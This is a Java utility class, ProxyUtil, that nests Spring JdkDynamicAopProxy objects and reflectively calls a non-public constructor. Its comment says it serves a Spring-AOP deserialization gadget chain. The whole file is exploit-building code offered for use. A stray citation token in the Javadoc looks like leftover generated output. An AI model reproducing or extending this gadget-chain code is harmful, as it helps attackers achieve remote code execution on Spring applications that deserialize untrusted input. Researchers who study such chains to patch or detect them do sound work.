import org.aopalliance.aop.Advice;
import org.aopalliance.intercept.MethodInterceptor;
import org.springframework.aop.aspectj.AbstractAspectJAdvice;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.support.DefaultIntroductionAdvisor;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;

/**
 * Utilities for wrapping an arbitrary object in one ― or two ― nested
 * JdkDynamicAopProxy instances so that it simultaneously implements
 * both {@code Advice} and {@code MethodInterceptor}.
 *
 * This is the trick the new Spring-AOP gadget chain relies on. :contentReference[oaicite:1]{index=1}
 */
public class ProxyUtil {

    private ProxyUtil() {}

    /** Single-layer proxy: make {@code obj} also look like {@code iface}. */
    public static Object getAProxy(Object obj, Class<?> iface) throws Exception {
        AdvisedSupport advised = new AdvisedSupport();
        advised.setTarget(obj);

        // A second (inner) proxy that implements both MethodInterceptor & Advice
        AbstractAspectJAdvice ajAdvice = (AbstractAspectJAdvice) obj;
        DefaultIntroductionAdvisor advisor = new DefaultIntroductionAdvisor(
                (Advice) getBProxy(ajAdvice,
                        new Class[]{MethodInterceptor.class, Advice.class}));
        advised.addAdvisor(advisor);

        InvocationHandler h = newJdkDynamicAopProxy(advised);
        return Proxy.newProxyInstance(
                ProxyUtil.class.getClassLoader(),
                new Class[]{iface},
                h);
    }

    /** Inner helper used by {@code getAProxy}. */
    public static Object getBProxy(Object obj, Class<?>[] ifaces) throws Exception {
        AdvisedSupport advised = new AdvisedSupport();
        advised.setTarget(obj);
        InvocationHandler h = newJdkDynamicAopProxy(advised);
        return Proxy.newProxyInstance(
                ProxyUtil.class.getClassLoader(),
                ifaces,
                h);
    }

    /** Reflectively build Spring’s {@code JdkDynamicAopProxy}. */
    private static InvocationHandler newJdkDynamicAopProxy(AdvisedSupport cfg)
            throws Exception {
        Constructor<?> c = Class
                .forName("org.springframework.aop.framework.JdkDynamicAopProxy")
                .getDeclaredConstructor(AdvisedSupport.class);
        c.setAccessible(true);
        return (InvocationHandler) c.newInstance(cfg);
    }
}
